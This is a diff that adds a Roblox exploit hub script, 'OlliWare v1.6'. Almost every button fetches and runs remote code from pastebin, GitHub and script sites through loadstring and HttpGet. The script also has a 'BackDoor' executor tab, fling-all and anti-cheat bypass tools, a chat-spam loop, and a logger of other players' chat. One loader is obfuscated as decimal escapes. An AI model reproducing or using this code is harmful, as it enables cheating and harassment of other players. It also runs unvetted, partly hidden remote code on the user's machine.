@@ -1,0 +1,599 @@
+Library = loadstring(game:HttpGet("https://pastebin.com/raw/vff1bQ9F"))()
+local Window = Library.CreateLib("‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎  ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ 0LLiWare Was Here‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ", "BloodTheme")
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "ScreenGui"
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ResetOnSpawn = false
+ 
+local Toggle = Instance.new("TextButton")
+Toggle.Name = "Hub"
+Toggle.Parent = ScreenGui
+Toggle.BackgroundColor3 = Color3.fromRGB(242, 22, 22)
+Toggle.Position = UDim2.new(0, 0, 0.454706937, 0)
+Toggle.Size = UDim2.new(0, 38, 0, 38)
+Toggle.Font = Enum.Font.SourceSans
+Toggle.Text = "Hub"
+Toggle.TextColor3 = Color3.fromRGB(248, 248, 248)
+Toggle.TextSize = 25.000
+Toggle.Draggable = false
+Toggle.MouseButton1Click:connect(function()
+    Library:ToggleUI()
+end)
+ 
+local Corner = Instance.new("UICorner")
+Corner.Name = "Corner"
+Corner.Parent = Toggle
+
+local Tab = Window:NewTab("main")
+local Section = Tab:NewSection("Info") 
+Section:NewLabel("This hub made by heck10010 alts: j_5k9")
+Section:NewLabel("0lliWare v1.6") 
+Section:NewLabel("Discord - https://discord.com/invite/kBvyM3p65f") 
+local e = game.Players.LocalPlayer
+
+Section:NewLabel("User Name: " .. e.Name)
+Section:NewLabel("User Display Name: " .. e.DisplayName)
+Section:NewLabel("User ID: " .. e.UserId)
+
+local function robloxlegoland(e)
+    local daysAgo = e.AccountAge
+    local currentDate = os.time()
+    local joinDate = os.date("*t", currentDate - (daysAgo * 24 * 60 * 60))
+    return string.format("%02d/%02d/%04d", joinDate.month, joinDate.day, joinDate.year)
+end
+
+local joinDate = robloxlegoland(e)
+Section:NewLabel("User Join Date: " .. joinDate)
+Section:NewLabel("Account Age: " .. e.AccountAge .. " days")
+
+local executor = "???"
+if identifyexecutor then
+    executor = identifyexecutor()
+end
+Section:NewLabel("Executor: " .. executor)
+local Tab = Window:NewTab("My Scripts")
+local Section = Tab:NewSection("RBBT Hub")
+Section:NewButton("RBBT Hub", "ButtonInfo", function()
+loadstring(game:HttpGet("https://pastebin.com/raw/Edg6HaM3"))() 
+    print("Clicked")
+end)
+local Tab = Window:NewTab("Hubs and Gui")
+local Section = Tab:NewSection("Hubs and Gui")
+Section:NewButton("Avtorhub", "ButtonInfo", function()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Avtor1zaTion/Avtor/main/AvtorHub'))()
+    print("Clicked")
+end)
+Section:NewButton("Ghost Hub", "ButtonInfo", function() 
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Ghost-Hub-9730"))()
+    print("Clicked")
+end)
+Section:NewButton("Malay Hub", "ButtonInfo", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/OpscriptPRO/OP-script/main/Malay%20hub%20V2"))()
+    print("Clicked")
+end)
+Section:NewButton("r15 animation", "bb", function() 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Gazer-Ha/Animated/main/G"))()
+    print("Clicked") 
+end) 
+Section:NewButton(" UTV v2.1", "VB", function() 
+getgenv().ActivateTheUltimateTrolly = true
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Orealated/Oreal/main/orealated%20Easy.gg%20UTH%20Loader", true))();
+    print(" Clicked") 
+end) 
+Section:NewButton("Suslik Hub", "ButtonInfo", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KrutoySuslik/-SuslikHub-/main/%7CSuslik%20Hub%7C%20%7CAll%20Scripts%7C"))()
+    print("Clicked")
+end)
+Section:NewButton("Sky Hub", " bb", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/SkyHub.txt"))()
+    print("Clicked")
+end)
+Section:NewButton("Game Hub v2", " bb", function()
+loadstring(game:HttpGet("https://github.com/GamerScripter/Game_Hub_v2/raw/main/loader"))()
+    print("Clicked")
+end)
+Section:NewButton("Fling gui badly", "ButtonInfo", function()
+loadstring(game:HttpGet('https://pastebin.com/raw/r97d7dS0', true))()
+    print("Clicked")
+end)
+Section:NewButton("selexity hub", "bb", function() 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/stangithuboffical/selexity/main/Main", true))()
+    print("Clicked") 
+end) 
+
+Section:NewButton("Vg Hub", "ButtonInfo", function() 
+loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-VG-Hub-4909"))()
+     print("Clicked")
+end)
+Section:NewButton("Ez Hub ", "ButtonInfo", function()
+loadstring(game:HttpGet("https://rawscripts.net/raw/Ez-Hub_168"))()
+    print("Clicked")
+end)
+Section:NewButton("System Hub V2", "ButtonInfo", function()
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-System-hub-V2-13161"))()
+    print("Clicked")
+end)
+Section:NewButton("Rose Hub", " hg", function() 
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Rose-hub-301-15465"))()
+    print("Clicked") 
+end) 
+Section:NewButton("Belated Hub", " bb", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Gelatekussy/GelatekHub/main/Main.lua"))()
+    print("Clicked")
+end)
+Section:NewButton("Hat Hub", " bb", function()
+loadstring(game:HttpGet("https://pastebin.com/raw/6tshcUd2"))()
+    print("Clicked")
+end)
+Section:NewButton("Universal Hub", "ButtonInfo", function()
+loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Universal-Hub-15648"))()
+      print("Clicked")
+end)
+Section:NewButton("OwlHub", "ButtonInfo", function()
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Owl-hub-8067"))()
+    print("Clicked")
+end)
+Section:NewButton("Lollypop hub", "ButtonInfo", function()
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-7x9-Lollypop-Hub-11113"))()
+    print("Clicked")
+end)
+Section:NewButton("Qúasàr hub", "ButtonInfo", function()
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Quasar-Hub-15467"))()
+    print("Clicked")
+end)
+Section:NewButton("BidoSkinsv1.2", "ButtonInfo", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BidoSkinsYT/BidoSkinsYT/main/Bido%20SkinsV1.2"))()
+    print("Clicked")
+end)
+Section:NewButton(" Chat Bypasser", "ButtonInfo", function()
+--[[ simple bypass
+888888b. Y88b   d88P       .d8888b.  888    d8P  8888888 8888888b.  8888888888 
+888  "88b Y88b d88P       d88P  Y88b 888   d8P     888   888   Y88b 888        
+888  .88P  Y88o88P        Y88b.      888  d8P      888   888    888 888        
+8888888K.   Y888P          "Y888b.   888d88K       888   888   d88P 8888888    
+888  "Y88b   888              "Y88b. 8888888b      888   8888888P"  888        
+888    888   888                "888 888  Y88b     888   888 T88b   888        
+888   d88P   888          Y88b  d88P 888   Y88b    888   888  T88b  888        
+8888888P"    888           "Y8888P"  888    Y88b 8888888 888   T88b 8888888888
+ 
+(discord): .x6x6
+(scriptblox): SkireScripts (https://scriptblox.com/u/SkireScripts)
+(server): gg/c3AbX3GXsr
+]]
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SkireScripts/Ouxie/main/Projects/simplebypass.lua"))()
+    print("Clicked")
+end)
+Section:NewButton("Rochip panel", "ButtonInfo", function() 
+if "Rochips Loader" then
+	local Rochips_panel,v,u,i=loadstring,"/snippets","gwwv","/raw/main.lua" ;
+	Rochips_panel(game:HttpGet("https://glot.io"..v.."/" ..u.."877ga3"..i))();
+	return "it will load in around 3 - 131 seconds"
+end
+    print("Clicked")
+end)
+Section:NewButton("Universal fe hub", "ButtonInfo", function()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Dvrknvss/UniversalFEScriptHub/main/Script'))()
+    print("Clicked")
+end)
+Section:NewButton("PShade reborn", "ButtonInfo", function() 
+getgenv().RTX_Name = "Midday lite" --not really needed if you don't need it
+
+--[[
+examples auto loads features :
+
+
+getgenv().RTX_Name = "Midday lite" 
+
+-Morning
+-Afternoon
+-Midday
+-Evening
+-Night
+-Midnight
+
+-Morning lite
+-Midday lite
+-Afternoon lite
+-Evening lite
+-Night lite
+-Midnight lite
+
+]]
+
+loadstring(game:HttpGet(('https://pastefy.app/xXkUxA0P/raw'),true))()
+    print("Clicked")
+end)
+local Tab = Window:NewTab("Universal") 
+local Section = Tab:NewSection("Fe scripts") 
+Section:NewButton("spider fe", "bb", function() 
+loadstring(game:HttpGet("https://pastebin.com/raw/txsk1LJg"))()
+    print("Clicked") 
+end) 
+Section:NewButton("fe npc controller", "nothing", function()
+loadstring(game:HttpGet(('https://pastefy.app/x8nWWq0M/raw'),true))()
+    print("Clicked")
+end)
+Section:NewButton("Illusion fe", "ButtonInfo", function()
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-Illusion-Script-12744"))()
+    print("Clicked")
+end)
+Section:NewButton("Anti Afk", "ButtonInfo", function() 
+for i,v in next, getconnections(game:GetService("Players").LocalPlayer.Idled) do
+                    v:Disable()
+end
+    print("Clicked")
+end)
+Section:NewButton("Ink Monster OP", "ButtonInfo", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe/main/obf_rTvXTs8F16D8D2oiLxZ62E1E9jT1we312yUyJr2h72Vwqr32l37rirU1S89hqRV7.lua.txt"))()
+    print("Clicked")
+end)
+Section:NewButton("Fe Ink Monster v2", " bb", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe/main/obf_f4i3ntKS5B8tK9zpCAnr31Dp7RNSYOo20gpln1fs1h2U4yjXNdNk6lFqZvN1Ft2p.lua.txt"))()
+    print("Clicked")
+end)
+Section:NewButton("Fe Bring", " bb", function()
+loadstring(game:HttpGet(('https://pastebin.com/raw/iThJgCAS'),true))()
+    print("Clicked")
+end)
+Section:NewButton("Chat Hax v3.5", "ButtonInfo", function()
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-Chat-Hax-V3.5-3512"))()
+    print("Clicked")
+end)
+Section:NewButton("Fe ball", "ButtonInfo", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Melishy/melishy-scripts/main/charball/script.lua", true))()
+    print("Clicked")
+end)
+Section:NewButton("WalkOnWalls", "ButtonInfo", function()  
+loadstring(game:HttpGet("https://raw.githubusercontent.com/sinret/rbxscript.com-scripts-reuploads-/main/WalkOnWalls", true))()
+     print("Clicked")
+end)
+Section:NewButton("fe parkur", "ButtonInfo", function()  
+loadstring(game:HttpGet(('https://pastefy.ga/Ucu1UkxZ/raw'),true))()
+    print("Clicked")
+end)
+Section:NewButton("Fe Angel", " nothimg", function() 
+loadstring(game:HttpGet("https://www.paste.tc/raw/fe-angel-script"))()
+    print("Clicked") 
+end) 
+Section:NewButton("Sus script", "ButtonInfo", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ChainOnToo/Unknown/main/Sus%20Missile%20Script"))()
+    print("Clicked")
+end)
+local Tab = Window:NewTab("Games")
+local Section = Tab:NewSection("Prison life")
+Section:NewButton("Prizz life", "ButtonInfo", function()
+--[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+loadstring(game:HttpGet('https://raw.githubusercontent.com/elliexmln/PrizzLife/main/pladmin.lua'))()
+    print("Clicked")
+end)
+Section:NewButton("Tiger Admin", "ButtonInfo", function()
+loadstring(game:HttpGet("https://rawscripts.net/raw/Prison-Life-Best-Gui-15940"))()
+    print("Clicked")
+end)
+Section:NewButton("Nihilz mobile", "ButtonInfo", function() 
+loadstring(game:HttpGet('https://pastebin.com/raw/QLtH2v8i'))()
+     print("Clicked")
+end)
+Section:NewButton("Prevail hub", "ButtonInfo", function()
+loadstring(game:HttpGet("https://rawscripts.net/raw/Prison-Life-(Cars-fixed!)-OP-Prison-Life-Prevail-X-GUI-5892"))()
+    print("Clicked")
+end)
+local Section = Tab:NewSection("Ragdoll engine")
+Section:NewButton("System broken hub", "Buttoninfo", function()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/script'))()
+    print("Clicked")
+end)
+Section:NewButton("Cryptonic hub", "ButtonInfo", function()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/martinelcrac/cryptonichub/main/Ragdollengine.lua'))()
+    print("Clicked")
+end)
+local Section = Tab:NewSection("BrookHaven")
+Section:NewButton("Ice Hub", "bb", function() 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMael7/NewIceHub/main/Brookhaven"))()
+    print("Clicked") 
+end) 
+local Section = Tab:NewSection("4nn1")
+Section:NewButton("TrollGui", "ButtonInfo", function()
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-4nn1-Troll-Gui-Remake-15595"))()
+    print("Clicked")
+end)
+local Section = Tab:NewSection("Murder Mystery 2")
+Section:NewButton("Symphony Hub", "ButtonInfo", function()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/ThatSick/ArrayField/main/SymphonyHub.lua'))()
+--subs to ryzzchips
+    print("Clicked")
+end)
+local Tab = Window:NewTab("Admin")
+local Section = Tab:NewSection("Admin") 
+Section:NewButton("Official Infinity Yeld reborn", "ButtonInfo", function()
+loadstring(game:HttpGet("https://github.com/fuckusfm/infiniteyield-reborn/raw/master/source"))()
+    print("Clicked")
+end)
+Section:NewButton("CMD", "ButtonInfo", function()
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Cmd-FE-13189"))()
+    print("Clicked")
+end)
+Section:NewButton("Nameless admin", "ButtonInfo", function()
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-nameless-admin-15646"))()
+    print("Clicked")
+end)
+local Tab = Window:NewTab("Misc")
+local Section = Tab:NewSection("Misc") 
+Section:NewButton("VulnPatcher", "Buttoninfo", function()
+loadstring(game:HttpGet"https://raw.githubusercontent.com/HtB1526/ArceusX_Scripts/main/Scripts/fluxusvulnpatcherv2.lua")
+    print("Clicked")
+end)
+
+Section:NewButton("Chat Log", "ButtonInfo", function()
+-- Farewell Infortality.
+-- Version: 2.82
+-- Instances:
+local ChatGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local LogPanel = Instance.new("ScrollingFrame")
+local Close = Instance.new("TextButton")
+local Mini = Instance.new("TextButton")
+local Log = Instance.new("TextButton")
+local title = Instance.new("TextLabel")
+--Properties:
+ChatGui.Name = "ChatGui"
+ChatGui.Parent = game.Players.LocalPlayer.PlayerGui
+ChatGui.ResetOnSpawn = false
+
+Frame.Parent = ChatGui
+Frame.BackgroundColor3 = Color3.new(0, 0, 0)
+Frame.BorderSizePixel = 0
+Frame.Position = UDim2.new(0.0278396439, 0, 0.565217376, 0)
+Frame.Size = UDim2.new(0, 392, 0, 25)
+Frame.Active = true
+Frame.Draggable = true
+
+LogPanel.Name = "LogPanel"
+LogPanel.Parent = Frame
+LogPanel.BackgroundColor3 = Color3.new(0, 0, 0)
+LogPanel.BorderColor3 = Color3.new(0.223529, 0.223529, 0.223529)
+LogPanel.Position = UDim2.new(-0.000221580267, 0, 0.968695641, 0)
+LogPanel.Size = UDim2.new(0, 392, 0, 203)
+LogPanel.ScrollBarThickness = 5
+LogPanel.ScrollingEnabled = true
+LogPanel.CanvasSize=UDim2.new(2,0,100,0)
+
+Close.Name = "Close"
+Close.Parent = Frame
+Close.BackgroundColor3 = Color3.new(1, 1, 1)
+Close.BackgroundTransparency = 1
+Close.Position = UDim2.new(0.823979557, 0, 0.0399999991, 0)
+Close.Size = UDim2.new(0, 69, 0, 24)
+Close.Font = Enum.Font.SourceSans
+Close.Text = "Close"
+Close.TextColor3 = Color3.new(1, 1, 1)
+Close.TextSize = 14
+
+Mini.Name = "Mini"
+Mini.Parent = Frame
+Mini.BackgroundColor3 = Color3.new(1, 1, 1)
+Mini.BackgroundTransparency = 1
+Mini.Position = UDim2.new(0.647959173, 0, 0, 0)
+Mini.Size = UDim2.new(0, 69, 0, 24)
+Mini.Font = Enum.Font.SourceSans
+Mini.Text = "Minimize"
+Mini.TextColor3 = Color3.new(1, 1, 1)
+Mini.TextSize = 14
+
+Log.Name = "Log"
+Log.Parent = Frame
+Log.BackgroundColor3 = Color3.new(1, 1, 1)
+Log.BackgroundTransparency = 1
+Log.Position = UDim2.new(0.293367326, 0, 0, 0)
+Log.Size = UDim2.new(0, 69, 0, 24)
+Log.Font = Enum.Font.SourceSans
+Log.Text = "Log Chat [ON]"
+Log.TextColor3 = Color3.new(1, 1, 1)
+Log.TextSize = 14
+
+title.Name = "title"
+title.Parent = Frame
+title.BackgroundColor3 = Color3.new(1, 1, 1)
+title.BackgroundTransparency = 1
+title.Size = UDim2.new(0, 115, 0, 24)
+title.Font = Enum.Font.SourceSans
+title.Text = "Chat GUI"
+title.TextColor3 = Color3.new(1, 1, 1)
+title.TextSize = 14
+title.TextXAlignment = Enum.TextXAlignment.Left
+-- Scripts:
+local logging = true
+local minimized = false
+Log.MouseButton1Down:Connect(function()
+	logging = not logging
+	if logging then Log.Text = "Log Chat [ON]" else Log.Text = "Log Chat [OFF]" end
+end)
+Mini.MouseButton1Down:Connect(function()
+	if minimized then
+		LogPanel:TweenSize(UDim2.new(0, 392, 0, 203), "InOut", "Sine", 0.5, false, nil)
+	else
+		LogPanel:TweenSize(UDim2.new(0, 392, 0, 0), "InOut", "Sine", 0.5, false, nil)
+	end
+	minimized = not minimized
+end)
+Close.MouseButton1Down:Connect(function()
+	ChatGui:Destroy()
+end)
+
+local prevOutputPos = 0
+function output(plr, msg)
+	if not logging then return end
+	local colour = Color3.fromRGB(255,255,255)
+	
+	if string.sub(msg, 1,1) == ":" or string.sub(msg,1,1) == ";" then colour = Color3.fromRGB(255,0,0) elseif string.sub(msg,1,2) == "/w" or string.sub(msg,1,7) == "/whisper" or string.sub(msg,1,5) == "/team" or string.sub(msg,1,2) == "/t" then colour = Color3.fromRGB(0,0,255) else colour = Color3.fromRGB(255,255,255) end
+	
+ 	local o = Instance.new("TextLabel",LogPanel)
+ 	o.Text = plr.Name .. ": " .. msg
+ 	o.Size = UDim2.new(0.5,0,.006,0)
+ 	o.Position = UDim2.new(0,0,.007 + prevOutputPos ,0)
+ 	o.Font = Enum.Font.SourceSansSemibold
+ 	o.TextColor3 = colour
+ 	o.TextStrokeTransparency = 0
+ 	o.BackgroundTransparency = 0
+	o.BackgroundColor3 = Color3.new(0,0,0)
+ 	o.BorderSizePixel = 0
+	o.BorderColor3 = Color3.new(0,0,0)
+ 	o.FontSize = "Size14"
+	o.TextXAlignment = Enum.TextXAlignment.Left
+ 	o.ClipsDescendants = true
+	prevOutputPos = prevOutputPos + 0.007
+	end
+
+for i,v in pairs(game.Players:GetChildren()) do
+	v.Chatted:Connect(function(msg)
+		output(v, msg)
+	end)
+end
+
+game.Players.ChildAdded:Connect(function(plr)
+	if plr:IsA("Player") then
+		plr.Chatted:Connect(function(msg)
+			output(plr, msg)
+		end)
+	end
+end)
+    print("Clicked")
+end)
+Section:NewButton("Antifling", "ButtonInfo", function()
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-antifling-script-ig-4705"))()
+    print("Clicked")
+end)
+Section:NewButton("Spam", "ButtonInfo", function()
+local settings = {
+   AutoChat_Time = 2.5,
+   AutoChat_Delay = 2.5,
+   AutoChat = true,
+}
+
+local chatrem = game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest
+
+while task.wait(settings.AutoChat_Time) do
+    chatrem:FireServer('ο||íwåŕȇ wåš ħȇŕȇ!', "All")
+    print("Sent Message")
+end
+    print("Clicked")
+end) 
+Section:NewButton("fling all", "ButtonInfo", function()
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fe-fling-all-10553"))()
+    print("Clicked")
+end)
+Section:NewButton("Dex Explorer", "ButtonInfo", function()
+local __function = loadstring(game:HttpGet("https://github.com/Hosvile/DEX-Explorer/releases/latest/download/main.lua", true))
+
+__function(__function)
+    print("Clicked")
+end)
+Section:NewButton("Simple spy", "ButtonInfo", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/RS/main/SimpleSpyMobile"))()
+    print("Clicked")
+end)
+local Tab = Window:NewTab("Netless")
+local Section = Tab:NewSection("Netless")
+Section:NewButton("fe sad kid", "ButtonInfo", function()
+loadstring(game:HttpGet("https://pastebin.com/raw/hgPJbwF0"))()
+    print("Clicked")
+end)
+Section:NewButton("Knife", "use netless bypass and v2!!!", function()
+loadstring(game:HttpGet(('https://pastefy.ga/d7sogwNS/raw'),true))()
+    print("Clicked")
+end)
+Section:NewButton("Caducus", "function z x c v b n m", function()
+loadstring(game:HttpGet("https://pastefy.app/awJrO3Q5/raw"))()
+    print("Clicked")
+end)
+Section:NewButton("stand ", "bb", function() 
+net = true -- if false = do nothing
+notify = true -- set this to false if u don't want to see notiflication
+--full credit to me_ozoneYT
+loadstring("\13\10\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\71\101\116\79\98\106\101\99\116\115\40\34\114\98\120\97\115\115\101\116\105\100\58\47\47\55\50\53\55\55\54\49\55\56\53\34\41\91\49\93\46\83\111\117\114\99\101\41\40\41\13\10")()
+    print("Clicked") 
+end) 
+Section:NewButton("honored", " bb", function() 
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/Cortzalno666/NectoVerse-Industries-Data/master/Scripts%20Folder/Honored.lua'),true))()
+    print("Clicked") 
+ end) 
+local Tab = Window:NewTab("BackDoor")
+local Section = Tab:NewSection("BackDoors")
+Section:NewButton("Sinner Backdoor executor", "ButtonInfo", function()
+loadstring(game:HttpGet("https://pastebin.com/raw/GSBHEA1Q"))()
+    print("Clicked")
+end)
+Section:NewButton("BackDoor V6", "ButtonInfo", function()
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Backdoor-V6X-15597"))()
+    print("Clicked")
+end)
+Section:NewButton("LaLoL Hub", "ButtonInfo", function()
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-LALOL-HUB-11604"))()
+    print("Clicked")
+end)
+local Tab = Window:NewTab("Genesis")
+local Section = Tab:NewSection("Genesis hats needs")
+Section:NewButton("Fe Goner", "ButtonInfo", function()
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-Goner-10857"))()
+    print("Clicked")
+end)
+Section:NewButton("Fe ak47", "ButtonInfo", function()
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-AK47-10851"))()
+    print("Clicked")
+end)
+Section:NewButton("Fe Linked Sword", "ButtonInfo", function()
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-Linked-Sword-10856"))()
+    print("Clicked")
+end)
+Section:NewButton("Fe Gale Fighter", "ButtonInfo", function()
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-Gale-Fighter-10854"))()
+    print("Clicked")
+end)
+Section:NewButton("Fe Neko", "ButtonInfo", function()
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-Neko-10858"))()
+    print("Clicked")
+end)
+Section:NewButton("Fe Sniper", "ButtonInfo", function()
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-Sniper-10848"))()
+    print("Clicked")
+end)
+Section:NewButton("Fe Neptunian V", "ButtonInfo", function()
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-Neptunian-V-10850"))()
+    print("Clicked")
+end)
+local Tab = Window:NewTab("Bypass")
+local Section = Tab:NewSection("Bypasses and anothers")
+Section:NewButton("network bypass", " Fe scripts works goodly", function() 
+game:GetService("RunService").RenderStepped:Connect(function()
+    setsimulationradius(math.huge)
+end)
+    print("Clicked") 
+end) 
+Section:NewButton("fe bypass by hidden", " nothing", function() 
+loadstring(game:HttpGet("https://www.paste.tc/raw/hidden-fe-bypass-2023"))()
+    print("Clicked") 
+end) 
+Section:NewButton("Netless bypass", "ButtonInfo", function()
+    -- when you reset make sure to re-execute this or just make this execute in a loop
+for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do
+    if v:IsA("BasePart") and v.Name ~="HumanoidRootPart" then 
+    game:GetService("RunService").Heartbeat:connect(function()
+    v.Velocity = Vector3.new(-30,0,0)
+    end)
+    end
+    end
+ 
+    game:GetService("StarterGui"):SetCore("SendNotification", { 
+        Title = "Notification";
+        Text = "Netless Ran";
+        Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
+    Duration = 16;
+    print("Clicked")
+end)
+Section:NewButton("netless bypass v2", "ButtonInfo", function()
+loadstring(game:HttpGet(('https://pastebin.com/raw/Cu7bKQWN'),true))()
+ 
+    print("Clicked")
+end)
